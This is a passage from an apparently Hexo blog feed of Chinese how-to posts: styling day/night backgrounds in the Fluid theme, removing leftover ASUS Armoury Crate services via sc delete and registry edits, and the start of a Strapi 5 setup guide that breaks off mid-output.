style="color: #D4D4D4">.</span><span style="color: #DCDCAA">clear</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">});</span></span></code></pre></div></div></figure><div class="note warning flat"><p>⚠️注意：<br>以上文件，别忘记在<code>_config.fluid.yml</code> 文件中的 <code>custom_css</code> 中进行引用。<br><code>URl1</code>、<code>mobileURL</code> 和 <code>fallbackURL</code> 等字符，仅作占位使用，实际应为真实图片链接。</p></div><p>因为 <code>injector.js</code> 的存在，所以 <code>backgroundize.js</code><strong>不需要</strong>在 <code>custom_js</code> 中引入，否则控制台中将会出现以下报错：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">Uncaught SyntaxError: Identifier 'colorToggleButton' has already been declared (at backgroundize.js:1:1)</span></span></code></pre></div></div></figure><p><code>_config.fluid.yml</code> 配置项：</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">custom_css</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  - </span><span style="color: #CE9178">/css/backgroundize.css</span></span></code></pre></div></div></figure><h2 id="预加载的可能问题"><a class="markdownIt-Anchor" href="#预加载的可能问题"></a> 预加载的可能问题</h2><p>如果你遇到了第一次切换主题，图片与图片之间的切换有些生硬，有点闪屏的感觉，但后续的所有切换却十分丝滑，那么很可能是预加载的失败。</p><h3 id="可能的问题来源"><a class="markdownIt-Anchor" href="#可能的问题来源"></a> 可能的问题来源</h3><div class="note info flat"><p>如果 <code>OSS/Bucket</code> 设置了响应头 <code>Cache-Control: no-store</code> 或 <code>max-age=0</code> 或没有启用 <code>Expires</code>，浏览器会认为每次访问都需要重新拉取。也就是尽管你预加载了，但切换时图片链接仍然会触发一次真正的请求。</p></div><p>我遇到的问题是，我使用的图片托管在阿里云的 oss 上，阿里云返回的响应头中存在：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">x-oss-force-download: true</span></span><span class="line"><span style="color: #D4D4D4">Content-Disposition: attachment</span></span></code></pre></div></div></figure><p>而 <code>Content-Disposition: attachment</code> 的含义是：<strong>这个资源是供下载用的</strong>，而不是网页内容的一部分。</p><p>浏览器遇到这种响应头时，通常会<strong>绕过图片的常规缓存路径</strong>，或者不会把它作为正常的预加载资源处理。</p><p>这就导致：</p><ul><li>图片不会进入 <code>memory</code> 或 <code>disk cache</code></li><li>即使预加载代码写得很好，浏览器仍然会每次点击切换时发起新请求</li><li>导致首次切换背景图时出现 “<strong>闪屏或延迟加载</strong>”</li></ul><p>翻阅文档，发现阿里云在很久之前就已经做出了调整：</p><p><code>出于安全考虑，通过OSS默认 Bucket域名访问文件时，OSS会强制增加下载响应头，导致浏览器强制下载文件。</code></p><p>也就是强制增加了 <code>x-oss-force-download: true</code> 使得 <code>Content-Disposition</code> 为附件类型。</p><p>如果遇到其他问题，欢迎讨论。</p><h3 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h3><p>如果你的托管平台可以更改元信息，那么请更改所需文件的元信息：</p><ul><li><p><code>Content-Disposition: attachment</code> 改为 <code>Content-Disposition: inline</code> 或留空</p></li><li><p><code>x-oss-force-download: true</code> 改为 <code>false</code></p></li></ul><p>阿里云平台是无法通过更改文件元信息来解决的。</p><p>阿里云的推荐方案是为 <code>oss/bucket</code> 绑定自定义域名，不再使用阿里云提供的默认域名。详见：<a href="https://help.aliyun.com/zh/oss/user-guide/map-custom-domain-names-5">绑定自定义域名至 Bucket 默认域名</a></p><p>或者，你也可以将图片托管在 GitHub 上，就直接使用仓库的 img 目录用于存放，GitHub 的响应头是符合要求的。</p><h2 id="非预期的切换效果"><a class="markdownIt-Anchor" href="#非预期的切换效果"></a> 非预期的切换效果</h2><p>如果你遇到了第一时间显示的不是预期的背景图，那么很可能是你在<code>_config.fluid.yml</code> 文件中的 <code>banner_img</code> 没有<strong>全部</strong>配置为空。</p><h2 id="无法匹配页面排除页面不生效"><a class="markdownIt-Anchor" href="#无法匹配页面排除页面不生效"></a> 无法匹配页面 / 排除页面不生效</h2><p>这一般是因为你的网站的永久链接生成方式与我不同。</p><p>该配置项通常在<code>_config.yml</code> 文件中可以找到。我的配置如下：</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955"># URL</span></span><span class="line"><span style="color: #6A9955">## 设置你的网站 URL，例如 GitHub Pages 上设置为 'https://username.github.io/project'</span></span><span class="line"><span style="color: #569CD6">url</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">https://4rozeN.github.io</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 网站的完整 URL</span></span><span class="line"><span style="color: #569CD6">permalink</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">archives/:category/:abbrlink.html</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 文章永久链接的格式</span></span><span class="line"><span style="color: #569CD6">abbrlink</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">alg</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 算法：crc16(default) and crc32 </span></span><span class="line"><span style="color: #569CD6">permalink_defaults</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">defaultPermaLink</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 默认永久链接的名称</span></span><span class="line"><span style="color: #569CD6">pretty_urls</span><span style="color: #D4D4D4">: </span><span style="color: #6A9955"># 优化 URL 美观性</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">trailing_index</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 如果设为 false，将去掉链接结尾的 'index.html'</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">trailing_html</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 如果设为 false，将去掉链接结尾的 '.html'</span></span></code></pre></div></div></figure><p>详见 Hexo 官方文档：<a href="https://hexo.io/zh-cn/docs/permalinks">【Hexo】- 永久链接（Permalinks）</a></p><p>什么意思呢？</p><p>我的代码中，写死了部分排除在外不会跟随日夜模式切换背景图的页面，这些页面都是能够被</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 排除在外的页面</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">PAGE_EXCLUSIONS</span><span style="color: #D4D4D4"> = [</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/links/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/about/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/categories/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/tags/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/collections/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #6A9955">// 校验</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">isExcludedPage</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"/"</span><span style="color: #D4D4D4">) </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">PAGE_EXCLUSIONS</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">some</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">excluded</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">startsWith</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">excluded</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>校验语句判断为真返回 <code>true</code> 的。但如果你的网站使用如：</p><ul><li><code>2013/07/14/hello-world/</code></li><li><code>2013-07-14-hello-world.html</code></li><li><code>foo/bar/hello-world/</code></li><li>……</li></ul><p>等等方案，我很难每个都适配，只得你自己进行修改。</p><p>修改其实也很简单，比如日期类的永久链接：<code>/2025/04/26/xxx/</code></p><p>你可以修改 <code>excludePages</code> 中的字符串为正则匹配符：<code>/^\/\d{4}\/\d{2}\/\d{2}\//</code></p><p>校验函数也可以修改为：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 用于判断当前页面是否在排除范围内</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">isExcludedPage</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">excludePathPatterns</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">some</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">pattern</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">pattern</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">test</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>总之，方法有很多。如果你没有这方面的基础，你也可以借助 AI 工具实现。当然，如果你的网站刚建立，更换永久链接是一件损失非常小的事情，如果你不想折腾的话，你也可以更换永久链接来适配代码。</p><div class="note warning flat"><p>⚠️ 注意：<br>更换永久链接意味着您的网站在各搜索引擎中的收录索引将会失效，重新索引可能需要一段时间，重新索引完成的时间将取决于您网站的流量高低。当然，您也可以手动前往提交索引请求，但这只是起到告知作用，重新索引完成的时间仍然未知。若您仍不明白这将有何影响，建议您不要更换永久链接。<br>如果您愿意更换永久链接生成方式，想暂时解决搜索引擎索引问题，可以考虑使用 <code>hexo-generator-alias</code> 插件，它可以帮助你实现旧链接重定向到新链接的效果。</p></div><h2 id="毛玻璃底页效果"><a class="markdownIt-Anchor" href="#毛玻璃底页效果"></a> 毛玻璃底页效果</h2><ol><li><p>修改<code>_config.fluid.yml</code> 文件的主面板背景色</p><figure class="shiki diff"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955"># 主面板背景色</span></span><span class="line"><span style="color: #6A9955"># Color of main board</span></span><span class="line"><span style="color: #CE9178">-board_color: "#ffffff"</span></span><span class="line"><span style="color: #CE9178">-board_color_dark: "#252d38"</span></span><span class="line"><span style="color: #B5CEA8">+board_color: "#ffffff80"</span></span><span class="line"><span style="color: #B5CEA8">+board_color_dark: "#00000080"</span></span></code></pre></div></div></figure></li><li><p><code>source/css</code> 目录下新建 <code>glassBg.css</code> 文件</p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">/* 正文底页毛玻璃效果 */</span></span><span class="line"><span style="color: #D7BA7D">#board</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-webkit-backdrop-filter</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">blur</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">backdrop-filter</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">blur</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #6A9955">/* 侧边目录毛玻璃效果 */</span></span><span class="line"><span style="color: #D7BA7D">#toc</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">4rem</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--board-bg-color</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-webkit-backdrop-filter</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">blur</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--background-blur</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">backdrop-filter</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">blur</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--background-blur</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure></li></ol><p>侧边的目录区域毛玻璃效果如果不需要可以删除。</p><h2 id="一些好用的插件"><a class="markdownIt-Anchor" href="#一些好用的插件"></a> 一些好用的插件</h2><p>Hexo 官方推荐插件就足够：<a href="https://fluid-dev.github.io/hexo-fluid-docs/advance/#hexo-%E6%8F%92%E4%BB%B6">https://fluid-dev.github.io/hexo-fluid-docs/advance/#hexo - 插件</a></p><h2 id="致谢"><a class="markdownIt-Anchor" href="#致谢"></a> 致谢</h2><p>感谢 <a href="https://github.com/banyee19">@banyee19</a> 在日夜背景图切换方面的探究，我一度以为我的切换效果是正常的，但使用其他设备进行查看后才发现效果无法正确实现，故此重构。</p><p>相关文章：</p><ul><li><a href="https://kznep19.blog/2025/04/26/%E7%99%BD%E5%A4%A9%E9%BB%91%E5%A4%9C%E8%83%8C%E6%99%AF%E5%9B%BE%E5%88%87%E6%8D%A2/">Hexo Fluid 背景图随日夜模式切换</a> by <a href="https://github.com/banyee19">@banyee19</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
            <tag> Hexo </tag>
            
            <tag> fluid </tag>
            
            <tag> 日夜切换背景 </tag>
            
            <tag> CSS </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华硕奥创中心以及其他服务组件彻底删除卸载</title>
      <link href="/posts/57159.html"/>
      <url>/posts/57159.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="有时候卸载奥创中心会残留一些它的其他服务，或者不知道如何卸载，本文将简要介绍如何对奥创中心以及它的其他服务项进行彻底删除。"><h2 id="卸载奥创中心"><a class="markdownIt-Anchor" href="#卸载奥创中心"></a> 卸载奥创中心</h2><p>要顺利卸载奥创中心你首先得去官网找到它的官方卸载工具（<a href="https://www.asus.com/supportonly/armoury%20crate/helpdesk_download/">官网在哪？</a>）</p><p>它长这样：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101729547.png" alt="image-20250110172917459"></p><p>你需要点击下方的 <code>Show all</code> 将其展开，找到 <code>Armour Create Uninstall Tool</code> 工具下载到本地并将其解压：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101730856.png" alt="image-20250110173033808"></p><p>它目录中应当包含以下文件：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101731079.png" alt="image-20250110173157054"></p><p>然后按照该工具的提示进行卸载即可。</p><h2 id="卸载残留问题"><a class="markdownIt-Anchor" href="#卸载残留问题"></a> 卸载残留问题</h2><p>不出意外的话往往卸载就出意外了，你会发现卸载后你的任务管理器中还运行着这些服务项：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101735064.jpeg" alt="img"></p><p>事实上没那么恐怖，这是它的注册表并未删除干净。</p><ul><li><p>Windows7 的用户可以找到计算机右键选择管理（或者 <code>Win+R</code> 输入 <code>services.msc</code> 打开服务），然后在服务列表中将先所有 ASUS 有关的服务全部停止，然后使用命令将其删除：</p><figure class="shiki shell"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">sc</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">delete</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">xxx</span></span></code></pre></div></div></figure></li></ul><p>需要注意的是服务名并非列表中展示给你看的名字，而是右键查看属性之后它展示的服务名称：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101742169.png" alt="image-20250110174216138"></p><ul><li><p>Windows10 及其以上用户先和 Win7 一样将所有有关的服务项先全部停止，然后 <code>Win+R</code> 输入 <code>regedit</code> 打开注册表编辑器，定位到：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</span></span></code></pre></div></div></figure><p>然后对照服务项列表里的服务名将注册表中的文件夹及其子项删除即可。</p></li></ul><p>最后的最后，别忘记重启电脑。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 华硕 </tag>
            
            <tag> 卸载问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文搞清 Strapi5 的安装与使用 | 踩坑爽 (bushi</title>
      <link href="/posts/45101.html"/>
      <url>/posts/45101.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><blockquote><p>我的 Strapi 版本：v5.0.0</p><p>节点版本：v20.13.1</p><p>数据库：MySQL8</p><table><thead><tr><th>数据库</th><th>受到推崇的</th><th>最低限度</th></tr></thead><tbody><tr><td> MySQL</td><td>8.0</td><td>8.0</td></tr><tr><td> 玛丽亚数据库</td><td> 10.6</td><td>10.5</td></tr><tr><td>PostgreSQL</td><td>14.0</td><td>12.0</td></tr><tr><td>SQLite</td><td>3</td><td>3</td></tr></tbody></table><p>Strapi 官方文档地址：<a href="https://strapi.nodejs.cn/dev-docs/installation/cli">https://strapi.nodejs.cn/dev-docs/installation/cli</a></p></blockquote><meta name="referrer" content="no-referrer"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>本篇文章主要是从安装到使用，说说我在 Windows | WindowsServer 上使用 Strapi5 作后端数据服务器时碰到的一切坑。</p><h2 id="安装-strapi"><a class="markdownIt-Anchor" href="#安装-strapi"></a> 安装 Strapi</h2><h3 id="检查本地环境"><a class="markdownIt-Anchor" href="#检查本地环境"></a> 检查本地环境</h3><p>请转到 <a href="https://strapi.nodejs.cn/dev-docs/installation/cli">Strapi 官方文档</a>，对照官方文档要求检查你本地的 <code>Node.js</code> 和 <code>npm</code> 版本。我的环境如下：</p><ul><li><p>Node.js 版本：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">$</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">node</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-v</span></span><span class="line"><span style="color: #DCDCAA">v20.13.1</span></span></code></pre></div></div></figure></li><li><p>npm 包管理器版本</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">$</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">npm</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-v</span></span><span class="line"><span style="color: #DCDCAA">10.8.2</span></span></code></pre></div></div></figure></li></ul><p>官方文档中使用 Python 是为了支持它默认的 SQLite 数据库，我这里使用的是 PHPStudy 集成的 MySQL8, 数据库，所以 Python 环境是不必须的。</p><blockquote><p>✋ 提醒</p><p>Strapi 不支持 MongoDB。</p></blockquote><h3 id="安装-yarn可选"><a class="markdownIt-Anchor" href="#安装-yarn可选"></a> 安装 yarn（可选）</h3><p>我之后投入了 yarn 的怀抱，所以这里可以安装一下 yarn 作为包管理器，<strong>非必须！</strong></p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">install</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-g</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">yarn</span></span></code></pre></div></div></figure><p>卸载命令是</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">uninstall</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">yarn</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-g</span></span></code></pre></div></div></figure><p>我的 yarn 版本是</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">$</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">yarn</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-v</span></span><span class="line"><span style="color: #DCDCAA">1.22.22</span></span></code></pre></div></div></figure><h2 id="创建-strapi-项目"><a class="markdownIt-Anchor" href="#创建-strapi-项目"></a> 创建 Strapi 项目</h2><p>在一个你准备好的目录中，使用终端 <code>cmd</code> 或 <code>powershell</code> 执行</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">yarn</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">create</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">strapi</span></span></code></pre></div></div></figure><blockquote><p>✋ 注意</p><p>Yarn does not support passing the version tag such as <code>@latest</code>, as opposed to npm. If you experience unexpected results with yarn and the latest version of Strapi is not installed, you might need to <a href="https://yarn.nodejs.cn/cli/cache/clean">run the <code>yarn cache clean</code> command</a> to clean your Yarn cache.</p><p>Yarn 不支持传递版本标签，如 <code>@latest </code>, 这与 npm 相反。如果您在使用 yarn 时遇到意外结果，没有安装最新版本的 Strapi，您可能需要运行 [yarn cache clean](<a href="https://yarn">https://yarn</a> . nodejs . cn/CLI/cache/clean) 命令来清理 Yarn 缓存。</p></blockquote><p>或者使用 npm</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npx</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">create-strapi@latest</span></span></code></pre></div></div></figure><p>我推荐创建时，使用 npm 以保证安装最新版本的 Strapi</p><p>以下是我的安装选择：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955"># E:\Coding\StrapiProjects\demo1</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">$</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">npx</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">create-strapi@latest</span></span><span class="line"><span style="color: #DCDCAA">Need</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">to</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">install</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">the</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">following</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">packages:</span></span><span class="line"><span style="color: #DCDCAA">create-strapi@5.0.5</span></span><span class="line"><span style="color: #DCDCAA">Ok</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">to</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">proceed?</span><span style="color: #D4D4D4"> (y) y</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Strapi</span><span style="color: #D4D4D4">   </span><span style="color: #CE9178">v5.0.5</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">�</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Let's create your new project</span></span><span class="line"></span><span class="line"><span style="color: #CE9178">? What is the name of your project? demo1</span></span><span class="line"><span style="color: #CE9178">? What is the name of your project? demo1</span></span><span class="line"></span><span class="line"><span style="color: #CE9178">We can't</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">find</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">any</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">auth</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">credentials</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">in</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">your</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Strapi</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">config.</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">Create</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">a</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">free</span><span style="color: 